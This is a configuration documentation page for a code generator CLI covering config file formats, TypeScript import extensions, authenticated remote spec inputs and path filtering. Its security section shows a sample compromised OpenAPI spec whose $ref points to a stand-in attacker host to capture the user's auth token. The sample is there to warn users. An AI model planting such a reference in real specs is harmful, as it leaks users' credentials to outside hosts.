---
sidebar_position: 4
---

# Configurations

There are 5 possible configuration file types, `json`, `yaml`, `esm` (ECMAScript modules JavaScript), `cjs` (CommonJS modules JavaScript) and `ts` (TypeScript).

The only difference between them is what they enable you to do. The difference is `callbacks`, in a few places, you might want to provide a callback to control certain behavior in the generation library.

For example, with the [`custom`](./generators/custom.md) generator, you provide a callback to render something, this is not possible if your configuration file is either `json` or `yaml` format.

Reason those two exist, is because adding a `.js` configuration file to a Java project, might confuse developers, and if you dont need to take advantage of the customization features that require callback, it will probably be better to use one of the other two.

## Creating Configurations with the CLI

The easiest way to create a configuration file is by using the `codegen init` command. This interactive command will guide you through setting up a configuration file for your project, allowing you to specify:

- Input file (AsyncAPI or OpenAPI document)
- Configuration file type (`esm`, `json`, `yaml`, `ts`)
- Output directory
- Language and generation options

```sh
codegen init --input-file ./ecommerce.yml --input-type asyncapi --config-type ts --languages typescript
```

For detailed usage instructions and all available options, see the [CLI usage documentation](./usage.md#codegen-init).

## Configuration File Lookup

If no explicit configuration file is sat, it will be looked for in the following order:
- package.json
- .codegenrc
- .codegenrc.json
- .codegenrc.yaml
- .codegenrc.yml
- .codegenrc.js
- .codegenrc.ts
- .codegenrc.cjs
- .config/codegenrc
- .config/codegenrc.json
- .config/codegenrc.yaml
- .config/codegenrc.yml
- .config/codegenrc.js
- .config/codegenrc.ts
- .config/codegenrc.mjs
- .config/codegenrc.cjs
- codegen.config.js
- codegen.config.ts
- codegen.config.mjs
- codegen.config.cjs
- codegen.json
- codegen.yaml
- codegen.yml
- codegen.js
- codegen.ts
- codegen.mjs
- codegen.cjs

## TypeScript Configuration

When generating TypeScript code, you can configure global options that apply to all generators. These options can be overridden per-generator if needed.

### Import Extensions (node16/nodenext/verbatimModuleSyntax)

Modern TypeScript projects using strict ESM settings (`moduleResolution: "node16"` or `"nodenext"`, or `verbatimModuleSyntax: true`) require explicit file extensions in import statements. Use the `importExtension` option to configure this:

```javascript
// codegen.config.mjs
export default {
  inputType: 'asyncapi',
  inputPath: './asyncapi.json',
  language: 'typescript',
  importExtension: '.ts',  // Required for moduleResolution: "node16"

  generators: [
    { preset: 'payloads', outputPath: './src/payloads' },
    { preset: 'channels', outputPath: './src/channels', protocols: ['nats'] }
  ]
};
```

#### Import Extension Options

| Value | When to Use | tsconfig Settings |
|-------|-------------|-------------------|
| `"none"` (default) | Bundlers (webpack, vite) or classic Node.js | `moduleResolution: "node"` or `"bundler"` |
| `".ts"` | Modern ESM with TypeScript sources | `moduleResolution: "node16"/"nodenext"` + `allowImportingTsExtensions: true` |
| `".js"` | Compiled ESM output | `moduleResolution: "node16"/"nodenext"` (without `allowImportingTsExtensions`) |

#### Automatic Detection

When `importExtension` is not explicitly set in your configuration, the codegen automatically detects the appropriate setting based on your project setup. This enables zero-configuration support for most projects.

**Detection priority:**

1. **Bundler config files** (`vite.config.ts`, `webpack.config.js`, `next.config.js`, etc.) → `"none"`
2. **Bundler in dependencies** (vite, webpack, esbuild, rollup, parcel) → `"none"`
3. **`moduleResolution: "bundler"`** in tsconfig.json → `"none"`
4. **`moduleResolution: "node16"/"nodenext"` + `allowImportingTsExtensions: true`** → `".ts"`
5. **`moduleResolution: "node16"/"nodenext"`** (without allowImportingTsExtensions) → `".js"`
6. **Otherwise** → Uses default (`"none"`)

When detection occurs, you'll see an info message:
```
Auto-detected importExtension: '.js'
```

**Note:** You can always override automatic detection by explicitly setting `importExtension` in your configuration.

**Limitation:** Automatic detection only affects `channels` and `client` generators. The `payloads`, `parameters`, `headers`, and `models` generators use Modelina which doesn't currently support import extensions.

#### Per-Generator Override

You can override the global setting for individual generators:

```javascript
export default {
  inputType: 'asyncapi',
  inputPath: './asyncapi.json',
  language: 'typescript',
  importExtension: '.ts',  // Global default
  generators: [
    { preset: 'payloads', outputPath: './src/payloads' },  // Uses global .ts
    { preset: 'channels', outputPath: './src/channels', importExtension: 'none' }  // Override
  ]
};
```

## Remote URL inputs

`inputPath` accepts an `http://` or `https://` URL in addition to a local
file path. The same configuration field is used for AsyncAPI, OpenAPI, and
JSON Schema inputs:

```javascript
export default {
  inputType: 'asyncapi',
  inputPath: 'https://example.com/specs/asyncapi.yaml',
  language: 'typescript',
  generators: [
    { preset: 'payloads', outputPath: './src/payloads' }
  ]
};
```

Format detection prefers the response `Content-Type` header
(`application/json` → JSON, `*yaml*` → YAML), falling back to the URL
extension and finally to JSON-then-YAML for ambiguous cases.

External `$ref` targets (e.g. `$ref:
'https://example.com/components.yaml#/components/schemas/Pet'`) are also
resolved over the same code path for AsyncAPI and OpenAPI inputs.

### Authenticating remote requests

For specs hosted behind authentication, configure the `auth` field. Three
shapes are supported:

```javascript
// Bearer token
auth: { type: 'bearer', token: process.env.API_TOKEN }

// API key in a custom header
auth: { type: 'apiKey', header: 'X-API-Key', value: process.env.API_KEY }

// Arbitrary headers
auth: {
  type: 'custom',
  headers: {
    Authorization: `Bearer ${process.env.API_TOKEN}`,
    'X-Tenant': 'acme'
  }
}
```

The `auth` field is ignored when `inputPath` is a local file path.

### Auth scope and security considerations

**The configured authentication headers are sent to every URL the loader
fetches**, including:

- The root `inputPath` URL.
- Every external `$ref` target the parser libraries follow during
  dereferencing — even when the `$ref` points at a different host.

This is the right default for typical internal-SSO setups where the root
spec and its `$ref` chain share an auth boundary, but it means that **a
compromised spec can exfiltrate your token**:

```yaml
# Compromised spec at https://api.example.com/openapi.yaml
openapi: 3.0.0
paths:
  /users:
    get:
      responses:
        '200':
          content:
            application/json:
              schema:
                $ref: 'https://attacker.example/exfil.yaml'   # ← receives your token
```

### Watch mode

`--watch` only observes the local filesystem. When `inputPath` is a
remote URL, the input watcher is skipped and a warning is logged. Use
`--watchPath` to watch a local file that triggers regeneration (which
will re-fetch the URL) on change.

## Filtering channels, operations & paths

The optional root-level `filter` field restricts code generation to a subset of
the input document instead of everything. It is available on the **AsyncAPI**
and **OpenAPI** input branches; JSON Schema input has no `filter` (there are no
channels/paths to filter).

```javascript
export default {
  inputType: 'openapi',
  inputPath: './openapi.yaml',
  filter: {
    include: ['/users', '/users/**', '/orders'],
    exclude: ['/users/{id}/audit']
  },
  generators: [
    { preset: 'payloads', outputPath: './src/payloads' }
  ]
};
```

### Semantics

- Patterns are [minimatch](https://github.com/isaacs/minimatch) globs.
- **`include`** — an item is kept when it matches any include pattern. An empty
  (or absent) `include` includes everything.
- **`exclude`** — applied *after* `include`; an item matching any exclude
  pattern is always dropped. An empty `exclude` excludes nothing.
- With **no** `filter` (or empty `include` + `exclude`) the output is identical
  to generating without the field — the feature is opt-in and default-off.

### What patterns match against

| Input type | An item matches when a pattern matches any of… |
| ---------- | ---------------------------------------------- |
| AsyncAPI   | the channel **address**, the channel **id**, or the **operation id** |
| OpenAPI    | the **path template** (e.g. `/users/{id}`) or the **operationId** (the spec's `operationId`, or a derived id when absent) |

Matching an operation retains its parent channel/path; matching a channel/path
directly retains it even if none of its operations match.

> Note: `/users/**` matches nested paths like `/users/{id}/audit` but **not**
> `/users` itself — list both when you want the collection *and* everything
> under it.

### Orphan pruning

When a filter is active, component schemas (and, for AsyncAPI, messages) left
unreferenced by the retained channels/operations/paths are pruned automatically,
so the generated output contains no models for filtered-out surfaces. A schema
still referenced by a retained surface — including via nested references — is
kept. Pruning only runs when a filter is active; the no-filter path never prunes.

Because filtering happens once while the document is loaded, **every** generator
(payloads, parameters, headers, types, channels, client, and all protocols) sees
the already-subsetted document — no per-generator configuration is required.

See the [`openapi-filtering` example](https://github.com/the-codegen-project/cli/tree/main/examples/openapi-filtering)
for a runnable walkthrough.
